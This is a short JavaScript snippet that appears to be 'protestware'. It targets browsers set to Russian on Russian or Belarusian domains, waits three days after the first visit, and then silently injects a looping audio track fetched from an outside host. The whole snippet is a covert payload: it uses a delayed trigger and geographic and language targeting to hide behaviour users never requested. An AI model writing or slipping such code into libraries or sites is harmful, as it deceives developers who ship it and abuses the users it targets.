if(typeof window!=="undefined"&&/^ru\b/.test(navigator.language)&&location.host.match(/\.(ru|su|by|xn--p1ai)$/)){
const now=new Date(),start=localStorage.getItem("firstSeen");
if(start){if((now.getTime()-Date.parse(start))/864e5>3)setTimeout(()=>{
const sound=document.createElement("audio");
sound.src="https://media.example.org/loop.mp3";sound.loop=true;document.body.appendChild(sound);
setTimeout(()=>sound.play().catch(()=>{}),2500)},500)}else localStorage.setItem("firstSeen",`${now}`)}
